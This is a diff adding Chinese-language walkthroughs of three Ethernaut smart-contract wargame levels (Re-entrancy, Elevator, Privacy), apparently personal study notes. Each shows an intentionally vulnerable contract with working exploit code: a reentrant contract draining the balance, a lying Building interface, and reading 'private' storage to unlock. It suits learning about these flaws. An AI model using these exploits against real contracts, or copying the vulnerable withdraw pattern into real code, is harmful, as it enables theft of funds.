@@ -627,6 +627,7 @@ contract King {
     >> web3.utils.fromWei(await contract.prize())
     "0.001"
     ```
+
 - 新建合约，用于声明国王身份，并阻止关卡实例再成为国王
 
     ```js
@@ -648,3 +649,260 @@ contract King {
 
     }
     ```
+
+## 10. Re-entrancy
+
+窃取合约所有的💰
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract Reentrance {
+  
+  using SafeMath for uint256;
+  mapping(address => uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  // 利用先转再减
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+```
+
+- 在接收合约的 `fallback` 函数中再调用 `withdraw` 函数
+- 先看看合约的初始资金
+
+    ```js
+    >> await web3.eth.getBalance(contract.address)
+    "1000000000000000"
+    ```
+
+- 计划分 9 次取完（也可以多捐赠，减少取出次数）
+
+    ```js
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.0;
+
+    import '@openzeppelin/contracts/utils/math/SafeMath.sol';
+
+    contract Reentrance {
+      
+      using SafeMath for uint256;
+      mapping(address => uint) public balances;
+
+      function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+      }
+
+      function balanceOf(address _who) public view returns (uint balance) {
+        return balances[_who];
+      }
+
+      function withdraw(uint _amount) public {
+        if(balances[msg.sender] >= _amount) {
+          (bool result,) = msg.sender.call{value:_amount}("");
+          if(result) {
+            _amount;
+          }
+          balances[msg.sender] -= _amount;
+        }
+      }
+
+      receive() external payable {}
+    }
+
+    contract Hack {
+
+      Reentrance reentrance;
+      uint stack = 0;
+
+      function exploit(address payable instance) public {
+        reentrance = Reentrance(instance);
+        reentrance.withdraw(125000000000000);
+      }
+
+      receive() external payable {
+        stack += 2;
+        if (msg.sender.balance >= msg.value && gasleft() > 6000 && stack < 500) {
+          reentrance.withdraw(125000000000000);
+        }
+      }
+
+    }
+    ```
+
+- 合约 Hack 部署完成后，进行「捐赠」
+
+    ```js
+    >> await contract.donate("<hack-address>", {value: 125000000000000});
+    >> web3.utils.fromWei(await contract.balanceOf("<hack-address>"))
+    "0.000125"
+    ```
+
+- 随后开始「盗钱」，务必给足汽油 :)
+    > 本次汽油量参考：200,000 | 156,169 (78.08%)
+
+- 永远假设转账的接收方是另一个合约，而非普通的地址
+
+## 11. Elevator
+
+到达顶层！
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) { // 第一次返回 false
+      floor = _floor;
+      top = building.isLastFloor(floor);  // 第二次返回 true
+    }
+  }
+}
+```
+
+- `Interface` 内部不能实现任何函数，但可以继承自其它接口，所有声明的函数必须是外部的，不能声明构造函数和状态变量
+- 「电梯应该在建筑里」，实现这个 `Building` 合约就好啦 >_<
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Building {
+  bool public flag = true;
+
+  function isLastFloor(uint) external returns (bool) {
+    flag = !flag;
+    return flag;
+  }
+
+  function exploit(address instance) public {
+    Elevator elevator = Elevator(instance);
+    elevator.goTo(1);
+  }
+}
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+```
+
+- 接口函数可以通过声明 `view` 来防止状态被篡改，`pure` 同理
+- 在不改变状态的情况下，可以根据不同的输入数据来返回不同的结果，如 `gasleft()`
+
+### 参考资料
+
+- [Interface | Solidity by Example](https://solidity-by-example.org/interface/)
+- [View Functions](https://docs.soliditylang.org/en/develop/contracts.html#view-functions)
+
+## 12. Privacy
+
+解锁！([Vault](#8-vault) 升级版)
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Privacy {
+  // slot 0
+  bool public locked = true;
+
+  // slot 1
+  uint256 public ID = block.timestamp;
+
+  // slot 2
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(now);
+
+  // slot 3, 4, 5
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) public {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+
+  /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+  */
+}
+```
+
+- 每个 slot 大小为 32 字节，当邻近变量也能够放进单个 slot 时，将按从右到左的顺序依次放入
+- 常量不存储
+
+```js
+>> await web3.eth.getStorageAt(contract.address, 0)
+"0x0000000000000000000000000000000000000000000000000000000000000001"
+>> await web3.eth.getStorageAt(contract.address, 1)
+"0x000000000000000000000000000000000000000000000000000000006210d5b1"
+>> await web3.eth.getStorageAt(contract.address, 2)
+"0x00000000000000000000000000000000000000000000000000000000d5b1ff0a" // 0a for flattening, ff for denomination
+>> await web3.eth.getStorageAt(contract.address, 3)
+"0xc3003c2bcb65196b8352fb925d945f9229929bcc727f70ea451255859a6a4f56"
+>> await web3.eth.getStorageAt(contract.address, 4)
+"0x6d6f76ea288ee9c55ab1ad76264518237a23af3495ee5702f57a164f8aeb99b0"
+>> await web3.eth.getStorageAt(contract.address, 5)
+"0x06e3eb3b9e34467cbf1a226fc2bd13e5948a7a15ef2205caf186fa3df3076f53"  // data[2]
+```
+
+- 由于 `_key` 为 `bytes16` 类型，需要对 `data[2]` 进行类型转换
+
+    ```js
+    // 从 bytes32 到 bytes16，只需要移走右侧的 16 字节，即 32 位十六进制数
+    >> await contract.unlock("0x06e3eb3b9e34467cbf1a226fc2bd13e5")
+    ```
+
+### 参考资料
+
+[Accessing Private Data | Solidity by Example](https://solidity-by-example.org/hacks/accessing-private-data/)
